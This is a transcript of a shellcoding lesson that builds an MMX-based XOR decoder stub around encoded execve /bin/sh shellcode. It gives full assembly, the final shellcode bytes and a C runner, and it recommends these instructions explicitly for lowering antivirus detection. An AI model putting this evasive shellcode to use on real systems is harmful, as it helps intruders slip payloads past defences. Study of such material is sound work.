#XOR Decoder using MMX

Hello all! In this video we will look at how to write XOR Decoder
using MMX instructions. 

Now, before moving into it as you know there are tons of instructions
apart from those that we have seen. And you also have instructions
specific for FPU and extensions such as MMX, SSE and SSE2. 

It's probably impossible to me to cover all of these. While at this
video I'd like to illustrate how you can write shellcode using some
of these instructions.

Now, what is the advantage of using this unconventional instructions
in your shellcode? Now, the most important is existing "popular"
shellcodes hardly use them. And what that automatically mean is
AV or other analysis tools would have lesser detection capabilities
for this. It is very easy to replicate existing functionality using
these extensions.

So let's go ahead and build our XOR decoder by that time using MMX
instructions. Now, MMX instructions are single instruction multiple
data instructions. What is that mean? Well, operate on blocks of data
on the same time other than individual bytes.

There are 8 registers from `MM0` to `MM7` which are part of the MMX
family. Now, each of these registers are 64-bits wide and can load
8 bytes which is a **qword** at any given time. And this is a chunk of
data you want to work with at any given point. 

Now, If you'd like to move data into any MMX register you use `movq`
instruction or "mov qword". And y=if you like to `xor` two MMX 
registers which are 8 bytes each loaded in them then you do this
using the `pxor` instruction. Now, the only thing I'd like to point out
that in contrast to previous XOR decoder in this case rather than 
operating on single bytes we are going to operate on chunks of 8 bytes
at a given time.

So let me show you and write `mmx-xor-decoder.nasm`. Let me first paste
our encoded `execve-stack` shellcode from previous lections.

```
$ nasm -f elf32 execve-stack.nasm
$ ld -o execve-stack execve-stack.o
$ shellcode-dump.sh execve-stack
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

```
$ ./XOREncoder.py 
Encoded shellcode ...
\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a
0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,
Len: 25
```
to `mmx-xor-decoder.nasm`. The length is 25 bytes something you need to
remember.

```asm
global _start

section .text
_start:





        EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

Now, to retrieve the address of encoded shellcode I am gonna use 
the JMP-CALL-POP technique. So we type

```asm
global _start

section .text
_start:

        jmp short call_decoder


decoder:
        pop edi

call_decoder:

        call decoder
        EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

and this gives us the address of encoded shellcode in memory in `edi`
register. Now what I am going to do is we gonna have 0xaa that's what
we used with `xor`. So I actually go to add 

```
call_decoder:

        call decoder
        decoder_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
        EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

So `pop edi` now actually gives us `decoder_value` address. Which 
basically means it points to this 8 `0xaa` which we are going to
use for decoding.

I would also like to load the address of our shellcode into `esi` so
`esi` would basically be `edi +8`

```asm
decoder:
        pop edi
        lea esi, [edi +8]
```

Now I want to run a counter but remind yourself that right now we
are not going to run counter for 25 bytes because the MMX instructions
operate on blocks of 8 which means we divide by 8. So let me go ahead
and move 4 inside `cl` register

```asm
decoder:
        pop edi
        lea esi, [edi +8]
        xor ecx, ecx
        mov cl, 4
```

And now let me write actual decode loop. This is where the MMX 
instructions come in. So I want to move chunks of 8 bytes inside.

```asm
decoder:
        pop edi
        lea esi, [edi +8]
        xor ecx, ecx
        mov cl, 4

decode:
        movq mm0, qword [edi]
		movq mm1, qword [esi]
```

Now `esi` is actually pointing to shellcode, while `edi` if you 
remember is pointing to 8 bytes of `decoder_value`.

I would like to `xor` both `mm0` and `mm1` and store the result in
`mm0`. So I use

```asm
decode:
        movq mm0, qword [edi]
        movq mm1, qword [esi]
        pxor mm0, mm1
```

Now I'd like to go ahead and store the result back by overwriting
the encoded shellcode part. So what I am going to do is basically

```asm
decode:
        movq mm0, qword [edi]
        movq mm1, qword [esi]
        pxor mm0, mm1

        movq qword [esi], mm0
		add esi, 0x8
```

we `add esi, 0x8` to move on the next 8 bytes of shellcode. And I
am basically going to add loop

```asm
decode:
        movq mm0, qword [edi]
        movq mm1, qword [esi]
        pxor mm0, mm1

        movq qword [esi], mm0
		add esi, 0x8
        loop decode
```

Once we are out of the loop there are 4 iterations and you are 
probably thinking this is more than 25 but we really don't care that
we overwrite because in `execve` shellcode we will never enter this
space of other bytes.

```asm
global _start

section .text
_start:

        jmp short call_decoder


decoder:
        pop edi
        lea esi, [edi +8]
        xor ecx, ecx
        mov cl, 4

decode:
        movq mm0, qword [edi]
        movq mm1, qword [esi]
        pxor mm0, mm1

        movq qword [esi], mm0
		add esi, 0x8
        loop decode

        jmp short EncodedShellcode

call_decoder:

        call decoder
        decoder_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
        EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

Let's assemble and link this

```
$ nasm -f elf32 mmx-xor-decoder.nasm
$ ld -o mmx-xor-decoder mmx-xor-decoder.o
```

Let's observe `objdump` to ensure that there are no NULLs here.

```
$ objdump -d ./mmx-xor-decoder -M intel

./mmx-xor-decoder:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 1b                	jmp    804807d <call_decoder>

08048062 <decoder>:
 8048062:	5f                   	pop    edi
 8048063:	8d 77 08             	lea    esi,[edi+0x8]
 8048066:	31 c9                	xor    ecx,ecx
 8048068:	b1 04                	mov    cl,0x4

0804806a <decode>:
 804806a:	0f 6f 07             	movq   mm0,QWORD PTR [edi]
 804806d:	0f 6f 0e             	movq   mm1,QWORD PTR [esi]
 8048070:	0f ef c1             	pxor   mm0,mm1
 8048073:	0f 7f 06             	movq   QWORD PTR [esi],mm0
 8048076:	83 c6 08             	add    esi,0x8
 8048079:	e2 ef                	loop   804806a <decode>
 804807b:	eb 0d                	jmp    804808a <EncodedShellcode>

0804807d <call_decoder>:
 804807d:	e8 e0 ff ff ff       	call   8048062 <decoder>

08048082 <decoder_value>:
 8048082:	aa                   	stos   BYTE PTR es:[edi],al
 8048083:	aa                   	stos   BYTE PTR es:[edi],al
 8048084:	aa                   	stos   BYTE PTR es:[edi],al
 8048085:	aa                   	stos   BYTE PTR es:[edi],al
 8048086:	aa                   	stos   BYTE PTR es:[edi],al
 8048087:	aa                   	stos   BYTE PTR es:[edi],al
 8048088:	aa                   	stos   BYTE PTR es:[edi],al
 8048089:	aa                   	stos   BYTE PTR es:[edi],al

0804808a <EncodedShellcode>:
 804808a:	9b                   	fwait
 804808b:	6a fa                	push   0xfffffffa
 804808d:	c2 85 85             	ret    0x8585
 8048090:	d9 c2                	fld    st(2)
 8048092:	c2 85 c8             	ret    0xc885
 8048095:	c3                   	ret    
 8048096:	c4 23                	les    esp,FWORD PTR [ebx]
 8048098:	49                   	dec    ecx
 8048099:	fa                   	cli    
 804809a:	23 48 f9             	and    ecx,DWORD PTR [eax-0x7]
 804809d:	23 4b 1a             	and    ecx,DWORD PTR [ebx+0x1a]
 80480a0:	a1                   	.byte 0xa1
 80480a1:	67                   	addr16
 80480a2:	2a                   	.byte 0x2a
```

Let's fetch shellcode

```
$ shellcode-dump.sh mmx-xor-decoder
"\xeb\x1b\x5f\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
```

copy this out and paste in `shellcode.c`

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1b\x5f\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

compile it

```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

```
$ ./shellcode Shellcode Length:  67
$ 
$ 
$ 
```

and there we go. So this exactly how you build XOR decoder and now
I just want to leave some exercises for you as well to try on your
own. 

So another way to actually get the address of GetPC (get program 
counter) is to basically use FPU instructions. And typically one which
is used is `FSTENV` which allows the processor to store the current
environment on the stack or basically memory location which we use
along with `FSTENV`. Now, `FSTENV` stores control, status and tag 
word, **instruction pointer**, data pointer etc. And really what it
does is points you to the last instruction which was executed in FPU.

So, this is how you can actually use MMX, or if you do some research,
SSE, SSE2 extensions or even FPU for different tasks in shellcoding.
Now I would highly recomend doing this and try to rewrite much of
the existing shellcode using this instructions because the detection
rates for these would be very very very less compared to tons of
"popular" shellcodes.

